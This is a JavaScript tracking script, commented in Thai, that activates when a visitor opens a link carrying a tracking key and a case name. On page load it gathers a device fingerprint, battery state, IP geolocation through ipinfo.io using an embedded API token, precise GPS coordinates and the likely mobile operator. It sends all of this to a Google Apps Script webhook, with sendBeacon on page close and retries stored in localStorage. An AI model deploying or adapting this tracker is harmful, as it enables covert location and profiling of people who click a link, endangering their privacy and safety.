// ฟังก์ชันดึง tracking key และ case name จาก URL parameters
function getUrlParameters() {
  try {
    const params = new URLSearchParams(window.location.search);
    return {
      trackingKey: params.get('daily') || "ไม่มีค่า",
      caseName: params.get('case') || "ไม่มีค่า",
      source: params.get('source') || "link" // แหล่งที่มา (image หรือ link)
    };
  } catch (error) {
    console.error("Error getting URL parameters:", error);
    return { trackingKey: "ไม่มีค่า", caseName: "ไม่มีค่า", source: "error" };
  }
}

// ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ
(function() {
  console.log("script.js execution started.");
  // เก็บข้อมูลทั่วไป
  const timestamp = new Date().toLocaleString('th-TH', {
    timeZone: 'Asia/Bangkok',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });

  // ดึง tracking key และ case name จาก URL
  const { trackingKey, caseName, source } = getUrlParameters();
  
  // สร้าง requestId ก่อน เพื่อรองรับกรณีที่อาจมีการปิดหน้าเว็บกะทันหัน
  const requestId = generateUniqueId();
  
  // สร้างออบเจ็กต์ข้อมูลเบื้องต้น (จะเพิ่มข้อมูลทีหลัง)
  let collectingData = {
    trackingKey: trackingKey,
    caseName: caseName,
    source: source,
    timestamp: timestamp,
    requestId: requestId
  };

  // --- เพิ่มการตรวจสอบ trackingKey ก่อนดำเนินการต่อ ---
  if (!trackingKey || trackingKey === "ไม่มีค่า") {
    console.error("No tracking key found, stopping execution.");
    return; // หยุดการทำงานหากไม่มี trackingKey
  }
  console.log("Tracking key is present:", trackingKey);

  // เก็บข้อมูลอุปกรณ์และข้อมูลอื่นๆ
  const deviceInfo = getDetailedDeviceInfo();
  const screenSize = `${window.screen.width}x${window.screen.height}`;
  const screenColorDepth = window.screen.colorDepth;
  const devicePixelRatio = window.devicePixelRatio || 1;
  const referrer = document.referrer || "ไม่มีข้อมูล";
  const language = navigator.language || navigator.userLanguage || "ไม่มีข้อมูล";
  const platform = deviceInfo.osInfo || navigator.platform || "ไม่มีข้อมูล";
  const connection = getConnectionInfo();
  const browser = detectBrowser();

  console.log("Device Info:", deviceInfo);
  console.log("Connection Info:", connection);
  console.log("Browser Info:", browser);
  
  // เพิ่มข้อมูลอุปกรณ์ลงในออบเจ็กต์ข้อมูล
  deviceInfo.screenSize = screenSize;
  deviceInfo.screenColorDepth = screenColorDepth;
  deviceInfo.devicePixelRatio = devicePixelRatio;
  deviceInfo.language = language;
  deviceInfo.connection = connection;
  deviceInfo.browser = browser;
  
  // อัปเดตข้อมูลในออบเจ็กต์
  collectingData.deviceInfo = deviceInfo;
  collectingData.referrer = referrer;

  // เริ่มกระบวนการในการรวบรวมข้อมูลและส่ง
  collectAndSendData();
  
  // ตรวจสอบการใช้งานแบตเตอรี่
  getBatteryInfo().then(batteryData => {
    console.log("Battery Info:", batteryData);
    // เพิ่มข้อมูลแบตเตอรี่ลงในข้อมูลที่จะส่ง
    deviceInfo.battery = batteryData;
    collectingData.deviceInfo = deviceInfo; // อัปเดตข้อมูล
  });
  
  // เพิ่ม event listener เพื่อส่งข้อมูลเมื่อผู้ใช้ปิดหน้าเว็บ
  window.addEventListener('beforeunload', function() {
    // ตรวจสอบว่า sendBeacon ทำงานได้หรือไม่
    if (navigator.sendBeacon) {
      console.log("Using sendBeacon to send final data.");
      
      // ส่งข้อมูลทันทีโดยไม่รอ
      collectingData.unloadTriggered = true; // เพิ่ม flag บอกว่าส่งจาก beforeunload event
      
      // แปลงเป็น blob เพื่อความเข้ากันได้กับ sendBeacon
      const blob = new Blob([JSON.stringify(collectingData)], {type: 'application/json'});
      
      // หากเป็นการทดสอบในโหมด dev ให้ส่งไปที่ endpoint test
      const webhookUrl = window.location.hostname === 'localhost' ? 
        'http://localhost:3000/log' : 
        'https://script.google.com/macros/s/AKfycbzBb6txri6Zp9lr6WQTei0a9EUNLHKa2WKq3-sNS8J52-T2gCvMvx-DPovbeZbsZ_fq/exec';
      
      // ใช้ sendBeacon เพื่อให้ยังส่งข้อมูลได้แม้ว่าหน้าเว็บจะปิดไปแล้ว
      navigator.sendBeacon(webhookUrl, blob);
    }
  });
  
  // ฟังก์ชันสำหรับรวบรวมและส่งข้อมูลทั้งหมด
  async function collectAndSendData() {
    try {
      // เริ่มดึงข้อมูล IP และตำแหน่ง GPS พร้อมกัน
      const ipInfoPromise = getIPDetails();
      const geoPromise = getLocationWithTimeout();
      const phoneInfoPromise = estimatePhoneNumber();
      
      // รอดึงข้อมูล IP เสร็จก่อน (สำคัญกว่า)
      try {
        const ipData = await ipInfoPromise;
        console.log("IP Info received:", ipData);
        collectingData.ip = ipData;
      } catch (ipError) {
        console.error("Error getting IP info:", ipError);
        collectingData.ip = { ip: "ไม่สามารถระบุได้", error: ipError.message };
      }
      
      // พยายามดึงข้อมูลโทรศัพท์ (ไม่สำคัญมาก)
      try {
        const phoneData = await phoneInfoPromise;
        console.log("Phone Info received:", phoneData);
        collectingData.phoneInfo = phoneData;
      } catch (phoneError) {
        console.error("Error getting phone info:", phoneError);
        collectingData.phoneInfo = { mobileOperator: "ไม่สามารถระบุได้", error: phoneError.message };
      }
      
      // รอข้อมูลตำแหน่ง GPS (ถ้ามี)
      try {
        const locationData = await geoPromise;
        console.log("Geolocation received:", locationData);
        collectingData.location = locationData;
      } catch (geoError) {
        console.error("Error getting geolocation:", geoError);
        collectingData.location = { error: geoError.message || "ปฏิเสธการให้ตำแหน่ง" };
      }
      
      // บันทึกเวลาที่เสร็จสิ้นการเก็บข้อมูล
      collectingData.dataCollectionCompleted = new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' });
      
      // ส่งข้อมูลไปยัง webhook
      console.log("Sending complete data to webhook:", collectingData);
      sendToLineNotify(collectingData);
      
    } catch (error) {
      console.error("Error in collectAndSendData:", error);
      // ถ้าเกิดข้อผิดพลาด ให้ลองส่งข้อมูลที่มีอยู่
      collectingData.error = error.message;
      collectingData.errorStack = error.stack;
      sendToLineNotify(collectingData);
    }
  }
})();

// สร้าง ID เฉพาะสำหรับการร้องขอ
function generateUniqueId() {
  // สร้าง ID ที่คาดเดายากขึ้นเล็กน้อย
  const timestamp = Date.now().toString(36);
  const randomPart = Math.random().toString(36).substring(2, 10);
  return `req-${timestamp}-${randomPart}`;
}

// ฟังก์ชันรวบรวมข้อมูลอุปกรณ์แบบละเอียด
function getDetailedDeviceInfo() {
  const userAgent = navigator.userAgent;
  const vendor = navigator.vendor || "ไม่มีข้อมูล";

  // ตัวแปรสำหรับเก็บข้อมูลละเอียด
  let deviceType = "คอมพิวเตอร์";  
  let deviceModel = "ไม่สามารถระบุได้";
  let osInfo = "ไม่สามารถระบุได้";
  let deviceBrand = "ไม่สามารถระบุได้";
  let osName = "ไม่สามารถระบุได้";
  let osVersion = "ไม่ระบุ";

  // ตรวจจับ iPad อย่างถูกต้อง
  const isIPad = detectIPad();

  // ตรวจจับ Device Type
  if (isIPad) {
    deviceType = "แท็บเล็ต";
    deviceBrand = "Apple";
    const deviceDetails = getIPadModel(userAgent);
    deviceModel = deviceDetails.model;
    osName = "iPadOS";
    osVersion = deviceDetails.version;
    osInfo = `${osName} ${osVersion}`;
  } else if (/iPhone|iPod/.test(userAgent)) {
    deviceType = "มือถือ";
    deviceBrand = "Apple";
    const deviceDetails = getIPhoneModel(userAgent);
    deviceModel = deviceDetails.model;
    osName = "iOS";
    osVersion = deviceDetails.version;
    osInfo = `${osName} ${osVersion}`;
  } else if (/android/i.test(userAgent)) {
    const androidInfo = getAndroidInfo(userAgent);
    deviceType = "มือถือ";
    deviceBrand = androidInfo.brand;
    deviceModel = androidInfo.model;
    osName = "Android";
    osVersion = androidInfo.osVersion.replace('Android ', '');
    osInfo = androidInfo.osVersion;
  } else if (/Macintosh|Mac OS X/i.test(userAgent)) {
    deviceType = "คอมพิวเตอร์";
    deviceBrand = "Apple";
    osName = "macOS";
    osVersion = getMacOSVersion(userAgent);
    osInfo = `${osName} ${osVersion}`;
  } else if (/Windows|Win64|Win32/i.test(userAgent)) {
    deviceType = "คอมพิวเตอร์";
    deviceBrand = "Windows PC";
    osName = "Windows";
    osVersion = getWindowsVersion(userAgent);
    osInfo = `${osName} ${osVersion}`;
  } else if (/Linux/i.test(userAgent)) {
    deviceType = "คอมพิวเตอร์";
    deviceBrand = "Linux PC";
    osName = "Linux";
    osVersion = "ไม่ระบุ";
    osInfo = "Linux";
  }

  // จัดรูปแบบ platform ให้สอดคล้องกัน
  let platformName = osName;

  return {
    userAgent: userAgent,
    vendor: vendor,
    deviceType: deviceType,
    deviceModel: deviceModel,
    osInfo: osInfo,
    osName: osName,
    osVersion: osVersion,
    platform: platformName,
    deviceBrand: deviceBrand
  };
}

// ฟังก์ชันตรวจสอบ iPad โดยเฉพาะ
function detectIPad() {
  const ua = navigator.userAgent;
  if (/iPad/.test(ua)) return true;
  if (/Macintosh/.test(ua) && navigator.maxTouchPoints > 1) return true; // iPadOS 13+
  // เพิ่มการตรวจสอบผ่าน platform API ถ้ามี
  if (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) return true;
  return false;
}

// ฟังก์ชันดึงข้อมูลรุ่น iPad
function getIPadModel(ua) {
  let model = "iPad";
  let version = "ไม่ระบุ";
  
  version = getIOSVersion(ua);
  
  // ตรรกะการระบุรุ่น iPad (อาจต้องอัปเดตตามรุ่นใหม่ๆ)
  const modelMatch = ua.match(/iPad([0-9]+,[0-9]+)/);
  if (modelMatch) {
    // มีข้อมูลรหัสรุ่นเฉพาะ เช่น iPad13,1
    model = `iPad (${modelMatch[1]})`;
  } else {
    // ไม่มีข้อมูลรหัสรุ่น ใช้ชื่อทั่วไป
    model = "iPad";
  }
  
  return { model: model, version: version };
}

// ฟังก์ชันดึงข้อมูลรุ่น iPhone
function getIPhoneModel(ua) {
  let model = "iPhone";
  let version = "ไม่ระบุ";
  
  version = getIOSVersion(ua);
  
  // ตรรกะการระบุรุ่น iPhone (อาจต้องอัปเดต)
  const modelMatch = ua.match(/iPhone([0-9]+,[0-9]+)/);
  if (modelMatch) {
    // มีข้อมูลรหัสรุ่นเฉพาะ เช่น iPhone13,1
    model = `iPhone (${modelMatch[1]})`;
  } else {
    // ไม่มีข้อมูลรหัสรุ่น ใช้ชื่อทั่วไป
    model = "iPhone";
  }
  
  return { model: model, version: version };
}

// ฟังก์ชันดึงข้อมูลรุ่นเครื่องและระบบ Android
function getAndroidInfo(ua) {
  let brand = "Android";
  let model = "ไม่ทราบรุ่น";
  let osVersion = "ไม่ทราบ";

  // ดึงเวอร์ชัน Android
  const androidVersionMatch = ua.match(/Android\s([0-9\.]+)/);
  if (androidVersionMatch) {
    osVersion = androidVersionMatch[1];
  }

  // ตรวจสอบยี่ห้อและรุ่น (ปรับปรุง regex และ logic)
  try {
    let modelInfo = ua.substring(ua.indexOf('(') + 1);
    modelInfo = modelInfo.substring(0, modelInfo.indexOf(')'));
    const modelParts = modelInfo.split(';').map(part => part.trim()).filter(part => part && part !== 'Android');
    
    if (modelParts.length > 1) {
      // พยายามระบุแบรนด์และรุ่น
      const commonBrands = ['Samsung', 'Xiaomi', 'Redmi', 'POCO', 'Huawei', 'Oppo', 'Vivo', 'OnePlus', 'Realme', 'Nokia', 'Sony', 'LG', 'Motorola', 'HTC'];
      
      for (let i = 0; i < modelParts.length; i++) {
        const part = modelParts[i];
        
        // ตรวจสอบว่า part นี้มีชื่อแบรนด์หรือไม่
        const foundBrand = commonBrands.find(b => part.includes(b));
        if (foundBrand) {
          brand = foundBrand;
          // ใช้ส่วนที่ถัดไปเป็นรุ่น (ถ้ามี)
          if (i + 1 < modelParts.length) {
            model = modelParts[i + 1];
          } else {
            model = part.replace(foundBrand, '').trim() || "ไม่ทราบรุ่น";
          }
          break;
        }
        
        // หากไม่พบแบรนด์เฉพาะ ใช้ส่วนแรกที่ไม่ใช่ Android เป็นรุ่น
        if (i === modelParts.length - 1) {
          model = part;
        }
      }
    } else if (modelParts.length === 1) {
      model = modelParts[0];
    }
  } catch (error) {
    console.error("Error parsing Android info:", error);
    model = "ไม่สามารถระบุรุ่นได้";
  }

  return {
    brand: brand,
    model: model,
    osVersion: `Android ${osVersion}`
  };
}

// ฟังก์ชันดึงเวอร์ชัน iOS
function getIOSVersion(ua) {
  const match = ua.match(/OS\s(\d+_\d+(_\d+)?)/i);
  if (match) {
    return match[1].replace(/_/g, '.');
  }
  // Fallback for older formats or WebKit version
  const webkitMatch = ua.match(/Version\/([\d\.]+)/i);
  if (webkitMatch) {
    return webkitMatch[1];
  }
  return "ไม่ทราบเวอร์ชัน";
}

// ฟังก์ชันดึงเวอร์ชัน macOS
function getMacOSVersion(ua) {
  const match = ua.match(/Mac OS X\s*([0-9_\.]+)/i);
  if (match) {
    const version = match[1].replace(/_/g, '.');
    // แปลงเวอร์ชันตัวเลขเป็นชื่อ
    if (version.startsWith('14')) return "Sonoma";
    if (version.startsWith('13')) return "Ventura";
    if (version.startsWith('12')) return "Monterey";
    if (version.startsWith('11')) return "Big Sur";
    if (version.startsWith('10.15')) return "Catalina";
    if (version.startsWith('10.14')) return "Mojave";
    // เพิ่มเติมตามต้องการ
    return `macOS ${version}`;
  }
  return "macOS";
}

// ฟังก์ชันดึงเวอร์ชัน Windows
function getWindowsVersion(ua) {
  if (/Windows NT 10.0/.test(ua)) return "11/10";
  if (/Windows NT 6.3/.test(ua)) return "8.1";
  if (/Windows NT 6.2/.test(ua)) return "8";
  if (/Windows NT 6.1/.test(ua)) return "7";
  // เพิ่มเติมตามต้องการ
  return "เวอร์ชันเก่า";
}

// ฟังก์ชันตรวจสอบประเภทการเชื่อมต่อแบบละเอียด
function getConnectionInfo() {
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  let info = {
    type: "ไม่ทราบ", // e.g., 'wifi', 'cellular', 'ethernet'
    effectiveType: "ไม่ทราบ", // e.g., '4g', '3g', '2g', 'slow-2g'
    downlink: null, // Mbps
    rtt: null, // ms
    saveData: false,
    isWifi: false,
    isMobile: false,
    networkType: "ไม่ทราบ" // Simplified type: WiFi, Mobile Data, Ethernet, Other
  };

  if (connection) {
    info.type = connection.type || "ไม่ทราบ";
    info.effectiveType = connection.effectiveType || "ไม่ทราบ";
    info.downlink = connection.downlink || null;
    info.rtt = connection.rtt || null;
    info.saveData = connection.saveData || false;

    if (info.type === 'wifi') {
      info.isWifi = true;
      info.networkType = "WiFi";
    } else if (info.type === 'cellular') {
      info.isMobile = true;
      // ใช้ effectiveType เพื่อประมาณความเร็ว
      if (info.effectiveType.includes('4g') || info.effectiveType.includes('5g')) info.networkType = "4G/5G";
      else if (info.effectiveType.includes('3g')) info.networkType = "3G";
      else if (info.effectiveType.includes('2g')) info.networkType = "2G";
      else info.networkType = "Mobile Data";
    } else if (info.type === 'ethernet') {
       info.networkType = "Ethernet";
    } else if (info.type !== 'unknown' && info.type !== 'none' && info.type !== 'other') {
       info.networkType = info.type; // ใช้ type โดยตรงถ้าไม่ใช่ค่าทั่วไป
    } else {
       // ถ้า type ไม่ชัดเจน ลองเดาจาก effectiveType
       if (info.effectiveType.includes('4g')) info.networkType = "Fast (4G-like)";
       else if (info.effectiveType.includes('3g')) info.networkType = "Medium (3G-like)";
       else if (info.effectiveType.includes('2g')) info.networkType = "Slow (2G-like)";
    }
  }

  return info;
}


// ฟังก์ชันตรวจสอบระดับแบตเตอรี่
async function getBatteryInfo() {
  try {
    if ('getBattery' in navigator) {
      const battery = await navigator.getBattery();
      return {
        level: Math.floor(battery.level * 100) + "%",
        charging: battery.charging ? "กำลังชาร์จ" : "ไม่ได้ชาร์จ"
      };
    }
    return { level: "ไม่รองรับ", charging: "ไม่รองรับ" };
  } catch (error) {
    console.error("Error getting battery info:", error);
    return { level: "ข้อผิดพลาด", charging: "ข้อผิดพลาด" };
  }
}

// ฟังก์ชันตรวจสอบประเภทเบราว์เซอร์
function detectBrowser() {
    const ua = navigator.userAgent;
    let browserName = "ไม่ทราบ";
    let fullVersion = "ไม่ทราบ";
    let majorVersion = "ไม่ทราบ";
    let nameOffset, verOffset, ix;

    // --- ตรวจสอบ In-App Browsers ก่อน ---
    if (ua.indexOf("FBAN") > -1 || ua.indexOf("FBAV") > -1) {
        browserName = "Facebook App";
    } else if (ua.indexOf("Instagram") > -1) {
        browserName = "Instagram App";
    } else if (ua.indexOf("Line") > -1) {
        browserName = "LINE App";
        verOffset = ua.indexOf("Line/");
        if (verOffset !== -1) fullVersion = ua.substring(verOffset + 5);
    } else if (ua.indexOf("Twitter") > -1) {
        browserName = "Twitter App";
    } else if (ua.indexOf("CriOS") > -1) { // Chrome on iOS
        browserName = "Chrome iOS";
        verOffset = ua.indexOf("CriOS/");
        if (verOffset !== -1) fullVersion = ua.substring(verOffset + 6);
    } else if (ua.indexOf("FxiOS") > -1) { // Firefox on iOS
        browserName = "Firefox iOS";
        verOffset = ua.indexOf("FxiOS/");
        if (verOffset !== -1) fullVersion = ua.substring(verOffset + 6);
    } else if (ua.indexOf("EdgiOS") > -1) { // Edge on iOS
        browserName = "Edge iOS";
        verOffset = ua.indexOf("EdgiOS/");
        if (verOffset !== -1) fullVersion = ua.substring(verOffset + 7);
    }
    // --- ตรวจสอบเบราว์เซอร์หลัก ---
    else if ((verOffset = ua.indexOf("Edg")) != -1) { // Microsoft Edge (Chromium)
        browserName = "Edge";
        fullVersion = ua.substring(verOffset + 4);
    } else if ((verOffset = ua.indexOf("SamsungBrowser")) != -1) { // Samsung Internet
        browserName = "Samsung Internet";
        fullVersion = ua.substring(verOffset + 15);
    } else if ((verOffset = ua.indexOf("OPR")) != -1 || (verOffset = ua.indexOf("Opera")) != -1) { // Opera
        browserName = "Opera";
        if (ua.indexOf("OPR") != -1) fullVersion = ua.substring(verOffset + 4);
        else fullVersion = ua.substring(verOffset + 6);
    } else if ((verOffset = ua.indexOf("Chrome")) != -1) { // Chrome (ต้องอยู่หลัง Edge และ Opera)
        browserName = "Chrome";
        fullVersion = ua.substring(verOffset + 7);
    } else if ((verOffset = ua.indexOf("Safari")) != -1) { // Safari (ต้องอยู่หลัง Chrome)
        browserName = "Safari";
        fullVersion = ua.substring(verOffset + 7);
        if ((verOffset = ua.indexOf("Version")) != -1)
            fullVersion = ua.substring(verOffset + 8);
    } else if ((verOffset = ua.indexOf("Firefox")) != -1) { // Firefox
        browserName = "Firefox";
        fullVersion = ua.substring(verOffset + 8);
    } else if ((nameOffset = ua.lastIndexOf(' ') + 1) < (verOffset = ua.lastIndexOf('/'))) { // Other browsers
        browserName = ua.substring(nameOffset, verOffset);
        fullVersion = ua.substring(verOffset + 1);
        if (browserName.toLowerCase() == browserName.toUpperCase()) {
            browserName = navigator.appName;
        }
    }

    // ตัดเวอร์ชันที่ไม่จำเป็นออก
    if ((ix = fullVersion.indexOf(";")) != -1) fullVersion = fullVersion.substring(0, ix);
    if ((ix = fullVersion.indexOf(" ")) != -1) fullVersion = fullVersion.substring(0, ix);
    if ((ix = fullVersion.indexOf(")")) != -1) fullVersion = fullVersion.substring(0, ix);

    majorVersion = parseInt('' + fullVersion, 10);
    if (isNaN(majorVersion)) {
        fullVersion = 'ไม่ทราบ';
        majorVersion = 'ไม่ทราบ';
    }

    // ตรวจสอบว่าเป็น WebView หรือไม่ (อาจไม่แม่นยำ 100%)
    let isWebView = (ua.indexOf("; wv") > -1) || // Android WebView
                    (ua.indexOf("iPhone") > -1 && ua.indexOf("Safari") === -1 && ua.indexOf("CriOS") === -1 && ua.indexOf("FxiOS") === -1) || // iOS WebView approximation
                    (browserName.includes("App")); // In-app browsers are WebViews

    return `${browserName} ${fullVersion}${isWebView ? ' (WebView)' : ''}`;
}


// ฟังก์ชันดึงข้อมูล IP โดยละเอียด (ใช้ ipinfo.io)
async function getIPDetails() {
  try {
    // ใช้ timeout เพื่อไม่ให้รอนานเกินไป
    const response = await Promise.race([
      fetch('https://ipinfo.io/json?token=9c7d8817e9115a'),
      new Promise((_, reject) => setTimeout(() => reject(new Error('IP info timeout')), 5000))
    ]);
    
    if (!response.ok) {
      throw new Error(`HTTP error: ${response.status}`);
    }
    
    return await response.json();
  } catch (error) {
    console.error("Error fetching IP details:", error);
    return { ip: "ไม่สามารถระบุได้", error: error.message };
  }
}

// ฟังก์ชันดึงตำแหน่ง GPS พร้อม timeout
function getLocationWithTimeout() {
  return new Promise((resolve, reject) => {
    // ตรวจสอบการสนับสนุน geolocation API
    if (!navigator.geolocation) {
      reject(new Error("Geolocation is not supported by this browser"));
      return;
    }
    
    // ตั้ง timeout สำหรับการรอตำแหน่ง
    const timeoutId = setTimeout(() => {
      reject(new Error("Location request timed out"));
    }, 10000); // 10 วินาที
    
    // ขอตำแหน่ง GPS
    navigator.geolocation.getCurrentPosition(
      (position) => {
        clearTimeout(timeoutId);
        const lat = position.coords.latitude;
        const long = position.coords.longitude;
        const accuracy = position.coords.accuracy;
        const gmapLink = `https://www.google.com/maps?q=${lat},${long}`;
        
        resolve({
          lat: lat,
          long: long,
          accuracy: accuracy,
          gmapLink: gmapLink
        });
      },
      (error) => {
        clearTimeout(timeoutId);
        console.error("Geolocation error:", error);
        
        let errorMessage;
        switch(error.code) {
          case error.PERMISSION_DENIED:
            errorMessage = "User denied the request for location";
            break;
          case error.POSITION_UNAVAILABLE:
            errorMessage = "Location information is unavailable";
            break;
          case error.TIMEOUT:
            errorMessage = "The request to get user location timed out";
            break;
          default:
            errorMessage = "An unknown error occurred when requesting location";
            break;
        }
        
        reject(new Error(errorMessage));
      }, 
      {
        enableHighAccuracy: true, 
        timeout: 8000, // 8 วินาที
        maximumAge: 0
      }
    );
  });
}

// ฟังก์ชันที่พยายามประมาณการเบอร์โทรศัพท์ (มีข้อจำกัด)
async function estimatePhoneNumber() {
  const phoneInfo = {
    mobileOperator: "ไม่สามารถระบุได้", // ชื่อเครือข่ายที่อาจดึงได้จาก API อื่นๆ (ยากมาก)
    possibleOperator: "ไม่สามารถระบุได้", // ชื่อเครือข่ายที่คาดเดาจาก ISP
    countryCode: "ไม่สามารถระบุได้", // รหัสประเทศจาก IP
    remarks: "ไม่สามารถระบุเบอร์โทรศัพท์โดยตรง" // หมายเหตุ
  };

  try {
    // 1. ตรวจสอบผู้ให้บริการโทรศัพท์จากข้อมูล IP
    const ipDetails = await getIPDetails(); // เรียกใช้ฟังก์ชันที่ปรับปรุงแล้ว

    // ใช้ข้อมูล ISP/Org จาก ipDetails
    const ispInfo = ipDetails.isp || ipDetails.org || "";

    // ตรวจสอบผู้ให้บริการในประเทศไทย
    const thaiOperators = {
      "AIS": ["AIS", "Advanced Info Service", "AWN", "ADVANCED WIRELESS NETWORK"],
      "DTAC": ["DTAC", "Total Access Communication", "DTN", "DTAC TriNet"],
      "TRUE": ["TRUE", "True Move", "TrueMove", "True Corporation", "TrueOnline", "Real Future"],
      "NT": ["CAT", "TOT", "National Telecom", "NT", "CAT Telecom", "TOT Public Company Limited"],
      "3BB": ["Triple T Broadband", "3BB", "Triple T Internet"]
    };

    // ค้นหาผู้ให้บริการจากชื่อ ISP/Org
    for (const [operator, keywords] of Object.entries(thaiOperators)) {
      if (keywords.some(keyword => ispInfo.toLowerCase().includes(keyword.toLowerCase()))) {
        phoneInfo.possibleOperator = operator;
        break;
      }
    }

    // 2. ดึงข้อมูลประเทศจาก IP
    if (ipDetails.country) {
      phoneInfo.countryCode = ipDetails.country; // เก็บ Country Code (เช่น TH)
      // อาจจะแปลงเป็นรหัสโทรศัพท์ถ้าต้องการ เช่น +66 สำหรับ TH
    }

    // 3. ตรวจสอบ Network Information API เพิ่มเติม
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection && connection.type === 'cellular') {
      phoneInfo.remarks = "เชื่อมต่อผ่านเครือข่ายมือถือ " + (phoneInfo.possibleOperator !== "ไม่สามารถระบุได้" ? `(${phoneInfo.possibleOperator})` : "");
    } else if (connection && connection.type === 'wifi') {
       phoneInfo.remarks = "เชื่อมต่อผ่าน WiFi";
    } else if (connection && connection.type === 'ethernet') {
       phoneInfo.remarks = "เชื่อมต่อผ่าน Ethernet";
    }


    return phoneInfo;

  } catch (error) {
    console.error("ไม่สามารถประมาณการข้อมูลโทรศัพท์ได้:", error);
    return phoneInfo; // คืนค่าเริ่มต้นถ้าเกิดข้อผิดพลาด
  }
}

// ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
function sendToLineNotify(dataToSend) {
  // สร้าง URL สำหรับส่งข้อมูล
  const webhookUrl = window.location.hostname === 'localhost' ? 
    'http://localhost:3000/log' : 
    'https://script.google.com/macros/s/AKfycbzBb6txri6Zp9lr6WQTei0a9EUNLHKa2WKq3-sNS8J52-T2gCvMvx-DPovbeZbsZ_fq/exec';
  
  // ตรวจสอบว่าเคยส่งข้อมูลของ requestId นี้ไปแล้วหรือไม่
  const requestId = dataToSend.requestId;
  const sentRequestIds = JSON.parse(localStorage.getItem('sentRequestIds') || '[]');
  
  if (sentRequestIds.includes(requestId)) {
    console.log(`ข้อมูลของ requestId ${requestId} ถูกส่งไปแล้ว ข้ามการส่งซ้ำ`);
    return;
  }
  
  // บันทึกว่าได้ส่งข้อมูล requestId นี้ไปแล้ว
  sentRequestIds.push(requestId);
  if (sentRequestIds.length > 50) sentRequestIds.shift(); // เก็บแค่ 50 รายการล่าสุด
  localStorage.setItem('sentRequestIds', JSON.stringify(sentRequestIds));
  
  // ทำการส่งข้อมูล
  console.log(`Sending data to webhook (${webhookUrl})...`);
  
  // แบบเดิม ใช้ fetch API
  fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(dataToSend)
  })
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP error: ${response.status}`);
    }
    console.log("Data sent successfully");
  })
  .catch(error => {
    console.error("Failed to send data:", error);
    
    // ถ้าส่งด้วย fetch ไม่สำเร็จ ให้ลองใช้ XMLHttpRequest แทน
    console.log("Trying with XMLHttpRequest as fallback...");
    const xhr = new XMLHttpRequest();
    xhr.open("POST", webhookUrl, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onreadystatechange = function() {
      if (xhr.readyState === 4) {
        if (xhr.status >= 200 && xhr.status < 300) {
          console.log("Data sent successfully via XHR");
        } else {
          console.error("XHR failed:", xhr.status, xhr.statusText);
          // บันทึกข้อมูลไว้ใน localStorage เพื่อส่งภายหลัง
          saveDataForRetry(dataToSend);
        }
      }
    };
    xhr.onerror = function() {
      console.error("XHR encountered an error");
      // บันทึกข้อมูลไว้ใน localStorage เพื่อส่งภายหลัง
      saveDataForRetry(dataToSend);
    };
    xhr.send(JSON.stringify(dataToSend));
  });
}

// ฟังก์ชันใหม่: บันทึกข้อมูลเพื่อส่งใหม่ภายหลัง
function saveDataForRetry(dataToSend) {
  try {
    // ดึงข้อมูลเก่า (ถ้ามี)
    const pendingData = JSON.parse(localStorage.getItem('pendingData') || '[]');
    
    // เพิ่มข้อมูลใหม่
    pendingData.push({
      data: dataToSend,
      timestamp: new Date().toISOString()
    });
    
    // จำกัดจำนวนข้อมูลที่เก็บ
    while (pendingData.length > 10) pendingData.shift();
    
    // บันทึกกลับ localStorage
    localStorage.setItem('pendingData', JSON.stringify(pendingData));
    console.log("Saved data for retry later");
  } catch (error) {
    console.error("Error saving data for retry:", error);
  }
}

// เพิ่มฟังก์ชันรีเทรีการส่งข้อมูลที่รอการส่งใหม่
function retryPendingSends() {
  try {
    const pendingData = JSON.parse(localStorage.getItem('pendingData') || '[]');
    if (pendingData.length === 0) return;
    
    console.log(`Found ${pendingData.length} pending requests to retry`);
    
    // ส่งข้อมูลที่รอการส่งอีกครั้ง
    pendingData.forEach((item, index) => {
      setTimeout(() => {
        console.log(`Retrying pending request ${index + 1}/${pendingData.length}`);
        sendToLineNotify(item.data);
      }, index * 1000); // ทยอยส่งทีละรายการ ห่างกัน 1 วินาที
    });
    
    // ล้างรายการที่รอการส่ง
    localStorage.removeItem('pendingData');
  } catch (error) {
    console.error("Error retrying pending sends:", error);
  }
}

// ทริกการลองส่งข้อมูลที่รอการส่งอีกครั้งเมื่อโหลดหน้าเว็บใหม่
setTimeout(retryPendingSends, 5000);
